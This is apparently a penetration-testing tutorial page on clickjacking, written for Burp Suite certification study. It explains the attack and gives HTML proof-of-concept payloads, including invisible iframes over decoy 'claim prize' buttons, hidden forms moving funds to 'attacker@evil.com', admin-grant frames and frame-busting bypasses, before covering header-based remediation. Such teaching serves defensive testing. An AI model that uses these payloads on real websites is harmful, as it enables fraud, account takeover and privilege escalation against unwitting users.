Clickjacking

Clickjacking (also called UI redressing) is an attack where an attacker overlays a transparent or hidden iframe containing a victim website on top of a fake decoy page. When users click what they think is a button on the decoy, they're actually clicking a hidden element on the victim site, triggering unintended actions like deleting accounts, transferring funds, or changing settings.

MEDIUM BSCP Beginner

Real-World Analogy

📖 The Transparent Sheet of Glass

Imagine a transparent sheet of glass placed over a "Win a Prize!" button. Behind the glass, there's another website with a "Delete Account" button positioned directly under where the glass is. When you see the "Win a Prize!" button and click on it, you think you're clicking the decoy. But you're actually clicking through the transparent glass to the hidden "Delete Account" button underneath. You've been clickjacked.

🎯 Day 1 · Quick Binary Check

On Day 1, perform a quick recon: check if the target's response headers include X-Frame-Options or Content-Security-Policy: frame-ancestors. If either is missing or set to ALLOWALL, the site may be vulnerable to clickjacking.

Quick check in Burp: Intercept any response → check headers → look for X-Frame-Options: DENY or CSP frame-ancestors 'none'. If neither exists, note it as a potential vulnerability.

🎯 Day 4 · Build a Real PoC

On Day 4, if headers are missing, build a working clickjacking proof-of-concept. Create an HTML page with a fake button that overlays a transparent iframe pointing to a sensitive action endpoint (e.g., account deletion or admin grant). Test it in a browser to confirm the attack works. This proves the vulnerability is exploitable in the real world.

How It Works

Clickjacking relies on framing ·the ability to embed one website inside another using an iframe. Here's the flow:

  1. Attacker creates a decoy webpage with attractive buttons ("Claim Prize!", "Watch Video")
  2. Attacker embeds the victim website in a transparent iframe above the decoy button
  3. User sees the decoy button and clicks it (unaware of the iframe)
  4. Click passes through the transparent iframe to the victim site below
  5. Victim site performs an action the user didn't intend (delete account, change settings, follow user, transfer funds)

Why it works: By default, browsers allow any website to embed any other website in an iframe. If the victim site doesn't send the X-Frame-Options: DENY or CSP frame-ancestors 'none' headers, there's no technical barrier to framing. The attack exploits user psychology (not paying attention to what they're clicking) combined with this lack of framing protection.

Simple vulnerable example:

<style>
  iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0.001;  /* Invisible but still clickable */
    z-index: 999;
  }
</style>

<h1>Click here to claim your prize!</h1>
<button style="font-size: 30px; padding: 20px;">CLAIM PRIZE</button>

<!-- Hidden iframe containing the victim site -->
<iframe src="https://bank.com/transfer?amount=1000&to=attacker@evil.com"></iframe>

When the user clicks the "CLAIM PRIZE" button, they're actually clicking the delete button on the hidden iframe.

Where to Look

Test clickjacking on any endpoint that performs a state-changing action and is accessible to an authenticated user:

  • Account management: Delete account, change password, add two-factor authentication
  • Financial transactions: Transfer funds, change bank details, request withdrawal
  • Administrative actions: Add admin user, change system settings, disable security features
  • Social interactions: Follow/unfollow user, change privacy settings, send messages
  • Data modification: Change email, update profile, delete records

First, check response headers: Every response from the target should include protection headers. In Burp, intercept any request and check the response for:

X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'

If these headers are absent or set to ALLOWALL, clickjacking is possible. If headers say SAMEORIGIN or 'self', they only protect if the site can't be framed from different origins ·but you might still frame it from the same origin if you have control over a subdomain or can conduct cross-origin tricks.

Burp Suite Workflow

1

Intercept a Request to a State-Changing Endpoint

Find an action that modifies state: account deletion, password change, admin grant, etc. Intercept the request in Burp Proxy.

2

Check Response Headers for Frame-Ancestors Protection

Look at the response headers. Search for:

X-Frame-Options
Content-Security-Policy

If neither header is present, or if X-Frame-Options is set to ALLOWALL, the page is likely vulnerable to clickjacking.

3

Use Burp's Clickjacking PoC Generator

Right-click on the request in Proxy or Repeater → Engagement tools → Generate Clickjacking PoC. Burp will generate an HTML file that frames the vulnerable endpoint with a decoy button on top.

4

Save and Open the PoC in a Browser

Burp generates an HTML file. Open it in a browser (not from the Burp proxy, to avoid auth issues). You should see a decoy button. Click it.

5

Verify the Hidden Action Was Triggered

If clickjacking works, the hidden action (e.g., account delete, admin grant) should execute. Check the target application to confirm: if you were testing account deletion, the account should now be deleted. If testing admin grant, the user should now be an admin.

6

Test Frame-Busting Bypass (Optional)

Some sites include JavaScript that breaks out of frames (frame-busting code like if (top !== self) { top.location = self.location; }). Try embedding the PoC with the iframe's sandbox attribute to disable frame-busting:

<iframe sandbox="allow-same-origin allow-forms allow-scripts"
        src="https://target.com/action"></iframe>

The sandbox attribute can prevent frame-busting JavaScript from executing.

Payloads & Techniques

Basic Clickjacking PoC (Transparent Iframe)

<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC</title>
  <style>
    body { background: #f0f0f0; font-family: Arial; padding: 50px; }
    .decoy {
      width: 300px;
      padding: 20px;
      background: #ff6600;
      color: white;
      font-size: 24px;
      text-align: center;
      cursor: pointer;
      border-radius: 5px;
      user-select: none;
    }
    iframe {
      position: absolute;
      top: 100px;
      left: 50px;
      width: 300px;
      height: 60px;
      opacity: 0.001;  /* Invisible */
      z-index: 999;
    }
  </style>
</head>
<body>
  <h1>Congratulations!</h1>
  <div class="decoy" onclick="alert('You clicked the decoy!')">
    CLICK HERE TO CLAIM YOUR PRIZE!
  </div>

  <!-- Hidden victim iframe -->
  <iframe src="https://target.com/account/delete"></iframe>
</body>
</html>

Prefilled Form Clickjacking

For POST-based actions, use a hidden form that auto-submits:

<form id="clickjack" action="https://target.com/transfer" method="POST"
      style="position: absolute; top: 100px; left: 50px; opacity: 0.001; z-index: 999;">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="recipient" value="attacker@evil.com">
  <input type="submit" value="Click here">
</form>

<div class="decoy">CLICK TO CLAIM PRIZE</div>

Iframe with Sandbox Bypass

If the target has frame-busting JavaScript, use the sandbox attribute to disable it:

<iframe sandbox="allow-same-origin allow-forms allow-scripts"
        src="https://target.com/admin/grant?user=attacker&role=admin"></iframe>

Double-Iframe Trick

Some sites use X-Frame-Options: SAMEORIGIN but can be framed from a subdomain or via data:// URLs:

<iframe src="data:text/html,
  <iframe src='https://target.com/action'></iframe>
"></iframe>

Clickjacking with Drag-Drop

Trick users into dragging an element over a hidden button:

<div draggable="true" id="fake" style="width: 200px; height: 100px; background: red;">
  Drag me to the drop zone
</div>
<iframe src="https://target.com/sensitive-action"
        style="position: absolute; opacity: 0.001; z-index: 999; width: 200px; height: 100px;"></iframe>

WAF Bypass Techniques

CSP `frame-ancestors` Bypass via Subdomain

If frame-ancestors is set to *.example.com, host your page on a compromised subdomain (e.g., attacker.example.com) to satisfy the wildcard.

X-Frame-Options: ALLOW-FROM Obsolescence

ALLOW-FROM is not supported in Chrome/Firefox. If the server sends X-Frame-Options: ALLOW-FROM https://trusted.com but no frame-ancestors CSP, modern browsers will allow framing from any origin.

Sandbox Attribute Tricks

<iframe sandbox="allow-forms allow-scripts allow-same-origin"> · allow-same-origin combined with allow-scripts can bypass sandboxing entirely. Test if removing specific sandbox flags enables the attack.

Double iframe

Nest iframes: outer from allowed origin → inner loads target. If only the outer frame's origin is checked for X-Frame-Options, the inner frame is unprotected.

Meta Refresh + iframe

Use <meta http-equiv="refresh"> to redirect the page into an iframe context. Bypasses some JavaScript frame-busting checks that run on load.

Drag-and-drop Jacking

Instead of click, use HTML5 drag-and-drop. Many clickjacking defenses only address click events; drag-and-drop on invisible elements can still steal data.

Exploitation & Impact

Account Takeover

Frame the email change or password reset endpoint. Trick the user into clicking a decoy button, which silently changes their email or initiates a password reset to an attacker-controlled email. Attacker then resets the password and takes over the account.

Financial Loss

Frame a money transfer endpoint with a prefilled form. User clicks a fake "Free Gift Card" button, which actually submits a transfer of $1,000 to the attacker's account.

Privilege Escalation

Frame an "Add Admin User" endpoint. Trick an existing admin into clicking a decoy, which grants admin rights to an attacker-controlled account.

Disable Security Features

Frame endpoints that disable two-factor authentication, change recovery emails, or modify security settings. Trick a user into clicking, which disables their 2FA, making their account easier to compromise later.

🚨 Real-World Impact

In 2010, researchers demonstrated clickjacking against Twitter by framing the "Follow User" endpoint. They created a decoy game that, when clicked, silently followed a malicious account. In another case, an attacker framed a bank's "Transfer Funds" endpoint and tricked users into transferring money just by clicking on what appeared to be a lottery link.

Remediation

1. Send X-Frame-Options Header (Legacy)

The X-Frame-Options header is the original defense. Set it to DENY to prevent any framing:

X-Frame-Options: DENY

This works in all modern browsers but is deprecated in favor of CSP.

2. Send Content-Security-Policy: frame-ancestors (Modern)

CSP frame-ancestors is more flexible and the recommended approach:

Content-Security-Policy: frame-ancestors 'none'

Or allow framing only from the same site:

Content-Security-Policy: frame-ancestors 'self'

3. Combine Both Headers

For maximum compatibility, send both:

X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

4. Server-Side Implementation Examples

Node.js/Express:

app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
  next();
});

Apache:

<Directory /var/www/html>
  Header always set X-Frame-Options "DENY"
  Header always set Content-Security-Policy "frame-ancestors 'none'"
</Directory>

Nginx:

server {
  add_header X-Frame-Options "DENY" always;
  add_header Content-Security-Policy "frame-ancestors 'none'" always;
}

5. Frame-Busting JavaScript (Not Reliable)

Do NOT rely solely on JavaScript to break out of frames, as it can be bypassed. If you do include it:

if (top !== self) {
  top.location = self.location;
}

This breaks out of frames, but the sandbox attribute or other tricks can prevent it from executing.

6. Require User Confirmation for Sensitive Actions

Always require an explicit confirmation (separate button click, CAPTCHA, or one-time code) for sensitive operations. This makes clickjacking harder because the attacker must orchestrate multiple clicks.

Common Beginner Mistakes

❌ Only Checking Headers Without Building PoC

Mistake: Checking X-Frame-Options header and reporting vulnerability based on that alone, without actually building a working PoC.

Fix: Always build a real PoC HTML file and test it in a browser. Some sites claim to allow framing but have additional JavaScript defenses.

❌ Testing Only GET Requests

Mistake: Only testing endpoints accessible via GET, ignoring POST-based actions.

Fix: Test POST actions by embedding a hidden form in your PoC that auto-submits.

❌ Forgetting About Frame-Busting Bypass

Mistake: Assuming frame-busting JavaScript prevents clickjacking entirely.

Fix: Try using the iframe sandbox attribute to disable JavaScript: sandbox="allow-same-origin allow-forms". This can bypass frame-busting.

❌ Not Considering CSRF Token or Session Cookies

Mistake: Forgetting that clickjacking only works if the user is already logged in. If the action requires a CSRF token, the attacker needs to trick the logged-in user.

Fix: Remember to test while logged in. If the action requires a fresh CSRF token in the URL, craft the PoC to include the current token.

❌ Reporting All Clickjacking as "High" Severity

Mistake: Treating all clickjacking the same way. Clickjacking severity depends on what action is being exploited.

Fix: Frame deletion, financial transfer, or admin grant → Critical/High. Frame less sensitive actions (follow user, change preferences) → Medium/Low.

CSRF
Clickjacking often requires CSRF tokens to exploit. CSRF covers token validation bypasses.
💉
XSS
XSS can be used to bypass frame-busting scripts or exploit additional vulnerabilities within a clickjacked frame.
🔗
CORS
CORS misconfigurations can allow cross-origin framing in ways that make clickjacking exploitation easier.
🌐
Host Header Injection
Host header attacks can manipulate CSP and X-Frame-Options policies, enabling clickjacking on otherwise protected pages.
